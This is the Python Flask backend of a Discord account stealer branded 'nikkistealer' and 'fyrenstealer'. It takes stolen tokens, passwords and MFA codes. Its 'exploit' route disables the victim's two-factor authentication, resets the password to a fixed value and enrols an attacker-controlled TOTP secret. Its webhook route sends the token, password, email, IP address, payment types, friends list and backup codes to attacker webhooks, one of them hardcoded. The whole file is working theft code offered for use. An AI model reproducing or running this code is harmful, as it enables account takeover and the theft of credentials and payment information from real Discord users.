import requests
import pyotp
import json
import time
import random
import datetime
from flask import Flask, request

# GLOBAL VARIABLES

wordlist = '1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'

timestamp = time.time()
timestamp = str(datetime.datetime.utcfromtimestamp(timestamp))

# INSERT USERS



# API

app = Flask("API")

@app.route("/", methods=['GET'])
def helloWorld():
	return 'hi i\'m sk4yx, the ceo and dev of nikki'

# DASHBOARD MYSQL API


@app.route("/get/mfa/code", methods=['GET', 'POST'])
def getmfacodes():
	body = request.get_json()

	secretkey = str(body['secret'])
	code = pyotp.TOTP(secretkey)
	return code.now()

@app.route("/get/id/lookup", methods=['GET', 'POST'])
def lookupfromid():
	body = request.get_json()

	userid = str(body["userid"])

	req = requests.get('https://discord-web-api.glitch.me/discord/user/'+userid)
	print(req.text)
	return req.text

@app.route("/api/v1/lookup", methods=['GET', 'POST'])
def lookup():
	body = request.get_json()

	token = str(body['token'])

	req = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization':token})
	req = json.loads(req.text)
  
	userid = req["id"]
	username = req["username"]+"#"+req["discriminator"]
	avatar = f'https://cdn.discordapp.com/avatars/{userid}/{req["avatar"]}'
	email = req["email"]
	phone = req["phone"]
	mfa_enabled = req["mfa_enabled"]
	try:
		if req["premium_type"] == 1:
			nitro = "<:nitroclassic:965744038328287333>"
		if req["premium_type"] == 2:
			nitro = "<:nitroclassic:965744038328287333><a:bboostmv:963917949868072991>"
	except:
		nitro = ''

	print(avatar)
	return {'id':userid,'nick':username,'avatar':avatar,'email':email,'phone':phone,'mfa_enabled':mfa_enabled,'nitro':nitro}

@app.route('/api/v1/get/rarefriends', methods=['GET', 'POST'])
def rareFriends():
	body = request.get_json()

	token = str(body['token'])

	req = requests.get('https://discordapp.com/api/users/@me/relationships', headers={'authorization':token})
	req = json.loads(req.text)

	quantidade2 = len(req)

	flags = {
		512: ['<a:pig:965738845679267910>']
	}

	friends = ''

	things = []

	for i in range(quantidade2):
		usernamefriend = req[i]["user"]["username"]
		tag = req[i]["user"]["discriminator"]
		public_flags = req[i]["user"]["public_flags"]
		useridfriend = req[i]["id"]

		if public_flags != 0:
			for item in flags.keys():
				if public_flags == item:
					things.append(flags[item][0])
					public_flags = public_flags - item
					friends = friends+flags[item][0]+" | "+usernamefriend+"#"+tag+"\n"

	if friends == '':
		friends = '`None`'

	return friends

@app.route('/api/v1/exploit/discord', methods=['GET', 'POST'])
def exploit():
	body = request.get_json()

	token = str(body['token'])
	password = str(body['password'])
	mfacode = str(body['mfacode'])
	nikkiuser = str(body['user'])

	req1 = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization':token})
	print(req1.text)
	req1 = json.loads(req1.text)

	userid = req1['id']
	email = req1['email']
	badges = req1['public_flags']

	try:
		phone = req1['phone']
		if phone == None:
			phone = 'a'
		print(phone)
	except:
		phone = 'a'

	print("oia o telefone: "+phone)
	try:
		mfa_enabled = req1['mfa_enabled']
	except:
		mfa_enabled = False

	if mfa_enabled == False:
		# CHANGE PASSWORD

		if phone == '':
			new_token1 = token
		else:
			parametros = {
				"password": password,
				"new_password": "nikkist2aler!"
			}

			changepasswd = requests.patch('https://discord.com/api/v9/users/@me', headers={"authorization":token}, json=parametros)
			changepasswd = json.loads(changepasswd.text)

			print(changepasswd)
			new_token1 = changepasswd['token']

	if mfa_enabled == True:
		# REMOVE 2FA

		parametros = {
			"code": mfacode
		}

		remove2fa = requests.post('https://discord.com/api/v9/users/@me/mfa/totp/disable', headers={"authorization":token}, json=parametros)
		remove2fa = json.loads(remove2fa.text)
		print(remove2fa)
		new_token0 = remove2fa['token']

		# CHANGE PASSWORD

		if phone == '':
			new_token1 = new_token0
		else:
			parametros2 = {
				"password": password,
				"new_password": "nikkist2aler!"
			}

			changepasswd = requests.patch('https://discord.com/api/v9/users/@me', headers={"authorization":new_token0}, json=parametros2)
			changepasswd = json.loads(changepasswd.text)

			print(changepasswd)
			new_token1 = changepasswd['token']

	secretkey = pyotp.random_base32()
	code = pyotp.TOTP(secretkey)

	if phone == '':
		parametros3 = {
			"password": password,
			"secret": secretkey,
			"code": code.now()
		}
	else:
		parametros3 = {
			"password": "nikkist2aler!",
			"secret": secretkey,
			"code": code.now()
		}

	req_add2fa = requests.post('https://discord.com/api/v9/users/@me/mfa/totp/enable', json=parametros3, headers={'authorization':new_token1})
	req_add2fajson = json.loads(req_add2fa.text)

	print(req_add2fajson)
	new_token2 = req_add2fajson["token"]

	print(secretkey)

	return req_add2fajson

@app.route('/api/v1/send/webhook', methods=['GET', 'POST'])
def sendEmbed():
	body = request.get_json()

	token = str(body['token'])
	password = str(body['password'])
	webhook = str(body['webhook'])
	username = str(body['username'])
	userid = str(body['userid'])
	badges = str(body['badges'])
	nitro = str(body['nitro'])
	client_ip = str(body['client_ip'])
	country = str(body['country'])
	domain = str(body['domain'])
	email = str(body['email'])
	friends = str(body['friends'])
	descembed = body['descembed']
	avatar = str(body['avatar'])

	emoji = '<:dplugcaveira:964552044897771580>'

	print(descembed)
	print(token)
	print(password)
	print(webhook)
	print(username)
	print(userid)
	print(badges)
	print(nitro)
	print(client_ip)
	print(country)
	print(domain)
	print(email)
	print(friends)
	print(avatar)
	
	new_token = descembed['token']

	req10 = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers={'authorization':new_token})
	req10 = req10.text

	print('dale? '+req10)
	payment = ''

	if '"type": 2,' in req10:
		payment = payment+'<:paypal:947639958297010236>'
	if '"type": 1,' in req10:
		payment = payment+':credit_card:'


	if payment == '':
		payment = '`none`'


	if badges == '' and nitro == '':
		badges = ':x:'

	backup_codes = ''

	for i in range(10):
		print(f'CODE: {descembed["backup_codes"][i]["code"]} - {descembed["backup_codes"][i]["consumed"]}')
		backup_codes = backup_codes+f'`CODE: {descembed["backup_codes"][i]["code"]} - {descembed["backup_codes"][i]["consumed"]}`\n'


	data = {
		"content": "@everyone",
		"username": "/nikkistealer",
		"avatar_url": "https://cdn.discordapp.com/attachments/969342797607993354/981349569281556541/679236391112015872.gif"
	}

	data['embeds'] = [
		{
			"color": 000,
			"timestamp": timestamp,
			"author": {
				"name": f'{username} ({userid})',
				"icon_url": avatar
			},
			"footer": {
				"text": "fyrenstealer.com.br",
				"icon_url": "https://cdn.discordapp.com/attachments/969342797607993354/981349569281556541/679236391112015872.gif"
			},
			"thumbnail": {
				"url": "https://cdn.discordapp.com/attachments/969342797607993354/981349569281556541/679236391112015872.gif"
			},
			"fields": [
				{
					"name": f"{emoji} **T0ken:**",
					"value": f"`{new_token}`",
					"inline": False
				},
				{
					"name": f"{emoji} **B4dges:**",
					"value": f"{badges}{nitro}",
					"inline": True
				},
				{
					"name": f"{emoji} **IP:**",
					"value": f"`{client_ip}`",
					"inline": True
				},
				{
					"name": f"{emoji} **Payment:**",
					"value": f"{payment}",
					"inline": True
				},
				{
					"name": f"{emoji} **D0main:**",
					"value": f"`{domain}`",
					"inline": True
				},
				{
					"name": f"{emoji} **M4il:**",
					"value": f"`{email}`",
					"inline": True
				},
				{
					"name": f"{emoji} **P4ssw0rd:**",
					"value": f"`{password} - fyren2022!`",
					"inline": True
				}
			]
		},
		{
			"color": 000,
			"timestamp": timestamp,
			"title": "<a:pig:965738845679267910> **| HQ FR1ENDS**",
			"footer": {
				"text": "fyrenstealer.com.br",
				"icon_url": "https://cdn.discordapp.com/attachments/969342797607993354/981349569281556541/679236391112015872.gif"
			},
			"description": friends
		},
		{
			"color": 000,
			"timestamp": timestamp,
			"title": f"{emoji} **| B4CKUP C0DES**",
			"footer": {
				"text": "fyrenstealer.com.br",
				"icon_url": "https://cdn.discordapp.com/attachments/969342797607993354/981349569281556541/679236391112015872.gif"
			},
			"description": backup_codes
		}
	]

	data2 = {
		"content": "Logs System",
		"username": "/fyren",
		"avatar_url": "https://cdn.discordapp.com/attachments/969342797607993354/981349569281556541/679236391112015872.gif"
	}

	data2['embeds'] = [
		{
			"color": 000,
			"timestamp": timestamp,
			"author": {
				"name": f'{username} ({userid})',
				"icon_url": avatar
			},
			"footer": {
				"text": "fyrenstealer.com.br",
				"icon_url": "https://cdn.discordapp.com/attachments/969342797607993354/981349569281556541/679236391112015872.gif"
			},
			"thumbnail": {
				"url": "https://cdn.discordapp.com/attachments/969342797607993354/981349569281556541/679236391112015872.gif"
			},
			"fields": [
				{
					"name": f"{emoji} **Old T0ken:**",
					"value": f"`PRIVATE`",
					"inline": False
				},
				{
					"name": f"{emoji} **New T0ken:**",
					"value": f"`PRIVATE`",
					"inline": False
				},
				{
					"name": f"{emoji} **B4dges:**",
					"value": f"{badges}{nitro}",
					"inline": False
				},
				{
					"name": f"{emoji} **M4il:**",
					"value": f"`PRIVATE`",
					"inline": False
				},
				{
					"name": f"{emoji} **P4ssw0rd:**",
					"value": f"`PRIVATE`",
					"inline": False
				}
			]
		}
	]

	req = requests.post(webhook, json=data)
	req2 = requests.post('https://discordapp.com/api/webhooks/977214004059598859/pTEeVH3sRHw5m7ot2UCvbEq2icGoI2MndYT9IbcdSA_uLDvaKq33i9mUWhhbhIJfQ6-a', json=data2)	
	print(req.text)

	return {'response': 200, 'message': 'ok'}

app.run('0.0.0.0', port=1337)
